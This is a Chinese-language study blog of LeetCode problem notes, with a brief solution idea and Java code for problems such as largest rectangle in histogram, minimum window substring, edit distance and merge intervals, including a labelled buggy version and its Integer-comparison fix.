<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        travel(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        travel(root.left);</span><br><span class="line">        res.add(root.val);</span><br><span class="line">        travel(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>todo：完成迭代、Morris 中序遍历 方法</p>
<h3 id="85-最大矩形"><a href="#85-最大矩形" class="headerlink" title="85. 最大矩形"></a><a href="https://leetcode.cn/problems/maximal-rectangle/">85. 最大矩形</a></h3><p>思路：固定行数，转成单调栈做法</p>
<p>todo</p>
<h3 id="84-柱状图中最大的矩形"><a href="#84-柱状图中最大的矩形" class="headerlink" title="84. 柱状图中最大的矩形"></a><a href="https://leetcode.cn/problems/largest-rectangle-in-histogram/">84. 柱状图中最大的矩形</a></h3><p>思路：对于每个柱子，记录其左右两边第一个比它小的柱子的序号。使用单调栈来辅助进行记录</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">largestRectangleArea</span><span class="params">(<span class="type">int</span>[] heights)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> heights.length;</span><br><span class="line">        <span class="type">int</span>[] left = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">int</span>[] right = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        Arrays.fill(left, -<span class="number">1</span>);</span><br><span class="line">        Arrays.fill(right, n);</span><br><span class="line">        Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!stack.isEmpty() &amp;&amp; heights[i] &lt; heights[stack.peek()])&#123;</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">pop</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                right[pop] = i;</span><br><span class="line">            &#125;</span><br><span class="line">            stack.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">        stack.clear();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!stack.isEmpty() &amp;&amp; heights[i] &lt; heights[stack.peek()])&#123;</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">pop</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                left[pop] = i;</span><br><span class="line">            &#125;</span><br><span class="line">            stack.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            res = Integer.max((right[i] - left[i] - <span class="number">1</span>) * heights[i], res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a><a href="https://leetcode.cn/problems/two-sum/">1. 两数之和</a></h3><p>思路：使用hashMap辅助</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        Map&lt;Integer,Integer&gt; hashtable = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer,Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(hashtable.containsKey(target-nums[i]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;hashtable.get(target-nums[i]),i&#125;;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                hashtable.put(nums[i],i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="78-子集"><a href="#78-子集" class="headerlink" title="78. 子集"></a><a href="https://leetcode.cn/problems/subsets/">78. 子集</a></h3><p>思路：搜索即可</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">subsets</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Integer&gt; cur = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        dfs(nums, <span class="number">0</span>, nums.length, cur, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> i, <span class="type">int</span> n, List&lt;Integer&gt; cur, List&lt;List&lt;Integer&gt;&gt; res)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i == n)&#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(cur));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(nums, i + <span class="number">1</span>, n, cur, res);</span><br><span class="line">        cur.add(nums[i]);</span><br><span class="line">        dfs(nums, i + <span class="number">1</span>, n, cur, res);</span><br><span class="line">        cur.remove(Integer.valueOf(nums[i]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="90题了"><a href="#90题了" class="headerlink" title="90题了"></a>90题了</h3><h3 id="76-最小覆盖子串"><a href="#76-最小覆盖子串" class="headerlink" title="76. 最小覆盖子串"></a><a href="https://leetcode.cn/problems/minimum-window-substring/">76. 最小覆盖子串</a></h3><p>思路：滑动窗口。</p>
<p>错误代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public String minWindow(String s, String t) &#123;</span><br><span class="line">        Map&lt;Character, Integer&gt; target = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Character, Integer&gt; cur = new HashMap&lt;&gt;();</span><br><span class="line">        for (int i = 0; i &lt; t.length(); i++) &#123;</span><br><span class="line">            target.merge(t.charAt(i), 1, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        int targetType = target.size();</span><br><span class="line">        // System.out.println(targetType);</span><br><span class="line">        int curType = 0;</span><br><span class="line">        int start = -1;</span><br><span class="line">        int minLength = Integer.MAX_VALUE;</span><br><span class="line">        int left = 0;</span><br><span class="line">        int right = 0;</span><br><span class="line">        System.out.println(target);</span><br><span class="line">        while (right &lt; s.length())&#123;</span><br><span class="line">            char ch = s.charAt(right);</span><br><span class="line">            if(target.containsKey(ch))&#123;</span><br><span class="line">                cur.merge(ch, 1, Integer::sum);</span><br><span class="line">                if(cur.get(ch) == target.get(ch))&#123;</span><br><span class="line">                    curType++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            //现在字串能满足条件了，移动子串，使得达到能够满足条件的最小长度</span><br><span class="line">            while (curType == targetType &amp;&amp; left &lt;= right)&#123;</span><br><span class="line">                if((right - left + 1) &lt; minLength)&#123;</span><br><span class="line">                    minLength = right - left + 1;</span><br><span class="line">                    start = left;</span><br><span class="line">                &#125;</span><br><span class="line">                char removeCh = s.charAt(left);</span><br><span class="line">                if(target.containsKey(removeCh))&#123;</span><br><span class="line">                    if(cur.get(removeCh) == target.get(removeCh)) curType--;</span><br><span class="line">                    cur.merge(s.charAt(left), -1, Integer::sum);</span><br><span class="line">                &#125;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">        // System.out.println(cur);</span><br><span class="line">        if(start == -1) return &quot;&quot;;</span><br><span class="line">        return s.substring(start, start + minLength);     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调了半天bug，发现cur.get(removeCh) &#x3D;&#x3D; target.get(removeCh) 比较错误。因为Integer使用了享元模式,-128-127使用的相同对象。大于的就不同了，需要使用equal进行判断</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">minWindow</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">        Map&lt;Character, Integer&gt; target = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Character, Integer&gt; cur = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; t.length(); i++) &#123;</span><br><span class="line">            target.merge(t.charAt(i), <span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">targetType</span> <span class="operator">=</span> target.size();</span><br><span class="line">        <span class="type">int</span> <span class="variable">curType</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">minLength</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        System.out.println(target);</span><br><span class="line">        <span class="keyword">while</span> (right &lt; s.length())&#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> s.charAt(right);</span><br><span class="line">            <span class="keyword">if</span>(target.containsKey(ch))&#123;</span><br><span class="line">                cur.merge(ch, <span class="number">1</span>, Integer::sum);</span><br><span class="line">                <span class="keyword">if</span>(cur.get(ch).equals(target.get(ch)))&#123;</span><br><span class="line">                    curType++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//现在字串能满足条件了，移动子串，使得达到能够满足条件的最小长度</span></span><br><span class="line">            <span class="keyword">while</span> (curType == targetType &amp;&amp; left &lt;= right)&#123;</span><br><span class="line">                <span class="keyword">if</span>((right - left + <span class="number">1</span>) &lt; minLength)&#123;</span><br><span class="line">                    minLength = right - left + <span class="number">1</span>;</span><br><span class="line">                    start = left;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">char</span> <span class="variable">removeCh</span> <span class="operator">=</span> s.charAt(left);</span><br><span class="line">                <span class="keyword">if</span>(target.containsKey(removeCh))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(cur.get(removeCh).equals(target.get(removeCh))) curType--;</span><br><span class="line">                    cur.merge(removeCh, -<span class="number">1</span>, Integer::sum);</span><br><span class="line">                &#125;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(start == -<span class="number">1</span>) <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> s.substring(start, start + minLength);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="75-颜色分类"><a href="#75-颜色分类" class="headerlink" title="75. 颜色分类"></a><a href="https://leetcode.cn/problems/sort-colors/">75. 颜色分类</a></h3><p>思路：排两遍，先把0排在前面，然后记录0个数，之后再把1排在2前面</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sortColors</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">zeroCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (right &lt; n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[right] == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                zeroCount++;</span><br><span class="line">                swap(nums, left, right);</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">        left = zeroCount;</span><br><span class="line">        right = zeroCount;</span><br><span class="line">        <span class="keyword">while</span> (right &lt; n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[right] == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                swap(nums, left, right);</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> i, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[i];</span><br><span class="line">        nums[i] = nums[j];</span><br><span class="line">        nums[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>备注：两个过程可以提取出函数来</p>
<h3 id="72-编辑距离"><a href="#72-编辑距离" class="headerlink" title="72. 编辑距离"></a><a href="https://leetcode.cn/problems/edit-distance/">72. 编辑距离</a></h3><p>思路：dp</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDistance</span><span class="params">(String word1, String word2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> word1.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> word2.length();</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][j] = j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(word1.charAt(i - <span class="number">1</span>) == word2.charAt(j - <span class="number">1</span>))&#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>]; <span class="comment">//</span></span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[i][j] = Integer.min(Integer.min(dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>]), dp[i - <span class="number">1</span>][j - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>备注：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(word1.charAt(i - 1) == word2.charAt(j - 1))&#123;</span><br><span class="line">                   dp[i][j] = dp[i - 1][j - 1]; //</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure>

<p>上面代码是默认了字符相等情况，直接用(i-1,j-1)的结果更优，但我感觉得证明下。<a href="https://blog.csdn.net/tianjindong0804/article/details/115803158">一文详解编辑距离（Levenshtein Distance）-CSDN博客</a></p>
<h3 id="70-爬楼梯"><a href="#70-爬楼梯" class="headerlink" title="70. 爬楼梯"></a><a href="https://leetcode.cn/problems/climbing-stairs/">70. 爬楼梯</a></h3><p>思路：模拟即可dp[i] &#x3D; dp[i-1] + dp[i-2]</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">twoStepBefore</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">oneStepBefore</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">cur</span> <span class="operator">=</span> oneStepBefore + twoStepBefore;</span><br><span class="line">            twoStepBefore = oneStepBefore;</span><br><span class="line">            oneStepBefore = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> oneStepBefore;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="581-最短无序连续子数组"><a href="#581-最短无序连续子数组" class="headerlink" title="581. 最短无序连续子数组"></a><a href="https://leetcode.cn/problems/shortest-unsorted-continuous-subarray/">581. 最短无序连续子数组</a></h3><p>思路：朴素思路，排序比对。进阶思路：滑动窗口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findUnsortedSubarray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right &amp;&amp; nums[left] &lt;= nums[left + <span class="number">1</span>]) left++;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right &amp;&amp; nums[right] &gt;= nums[right - <span class="number">1</span>]) right--;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left1</span> <span class="operator">=</span> left;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right1</span> <span class="operator">=</span> right;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">u</span> <span class="operator">=</span> left1; u &lt;= right1; u++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(left &gt;= <span class="number">0</span> &amp;&amp; nums[u] &lt; nums[left])&#123;</span><br><span class="line">                <span class="keyword">while</span> (left &gt;= <span class="number">0</span> &amp;&amp; nums[u] &lt; nums[left]) left--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(right &lt;= nums.length - <span class="number">1</span> &amp;&amp; nums[u] &gt; nums[right])&#123;</span><br><span class="line">                <span class="keyword">while</span> (right &lt;= nums.length - <span class="number">1</span> &amp;&amp; nums[u] &gt; nums[right]) right++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left == right ? <span class="number">0</span> : right - left - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="64-最小路径和"><a href="#64-最小路径和" class="headerlink" title="64. 最小路径和"></a><a href="https://leetcode.cn/problems/minimum-path-sum/">64. 最小路径和</a></h3><p>思路：动态规划</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minPathSum</span><span class="params">(<span class="type">int</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> grid.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            dp[j] = grid[<span class="number">0</span>][j] + left;</span><br><span class="line">            left = dp[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">leftVal</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dp[j] = Integer.min(dp[j], leftVal) + grid[i][j];</span><br><span class="line">                leftVal = dp[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n - <span class="number">1</span>];        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="62-不同路径"><a href="#62-不同路径" class="headerlink" title="62. 不同路径"></a><a href="https://leetcode.cn/problems/unique-paths/">62. 不同路径</a></h3><p>思路：跟64很像</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">uniquePaths</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        Arrays.fill(dp, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">leftVal</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dp[j] += leftVal;</span><br><span class="line">                leftVal = dp[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n - <span class="number">1</span>];        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="56-合并区间"><a href="#56-合并区间" class="headerlink" title="56. 合并区间"></a><a href="https://leetcode.cn/problems/merge-intervals/">56. 合并区间</a></h3><p>思路：先按照左端点排序，在按照右端点排序</p>
<p>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int[][] merge(int[][] intervals) &#123;</span><br><span class="line">        List&lt;int[]&gt; res = new ArrayList&lt;&gt;();</span><br><span class="line">        Arrays.sort(intervals, new Comparator&lt;int[]&gt;() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public int compare(int[] o1, int[] o2) &#123;</span><br><span class="line">                Integer a = 1;</span><br><span class="line">                if (o1[0] == o2[0]) return o1[1] - o2[1];</span><br><span class="line">                return o1[0] - o2[0];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        int left = intervals[0][0];</span><br><span class="line">        int right = intervals[0][1];</span><br><span class="line">        int n = intervals.length;</span><br><span class="line">        for (int i = 1; i &lt; n; i++) &#123;</span><br><span class="line">            int[] interval = intervals[i];</span><br><span class="line">            if (interval[0] &gt; right) &#123;</span><br><span class="line">                res.add(new int[]&#123;left, right&#125;);</span><br><span class="line">                left = interval[0];</span><br><span class="line">            &#125;</span><br><span class="line">            right = Integer.max(right, interval[1]);</span><br><span class="line">        &#125;</span><br><span class="line">        res.add(new int[]&#123;left, right&#125;);</span><br><span class="line">        return res.toArray(new int[res.size()][2]);      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="55-跳跃游戏"><a href="#55-跳跃游戏" class="headerlink" title="55. 跳跃游戏"></a><a href="https://leetcode.cn/problems/jump-game/">55. 跳跃游戏</a></h3><p>思路：维护最右边可以到达得位置</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canJump</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxTarget</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i &gt; maxTarget) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            maxTarget = Integer.max(maxTarget, nums[i] + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="53-最大子数组和"><a href="#53-最大子数组和" class="headerlink" title="53. 最大子数组和"></a><a href="https://leetcode.cn/problems/maximum-subarray/">53. 最大子数组和</a></h3><p>思路：动态规划然后发现可以维护个左边值即可</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> Integer.MIN_VALUE;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftSumMax</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">cur</span> <span class="operator">=</span> num + Integer.max(<span class="number">0</span>, leftSumMax);</span><br><span class="line">            res = Integer.max(res, cur);</span><br><span class="line">            leftSumMax = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



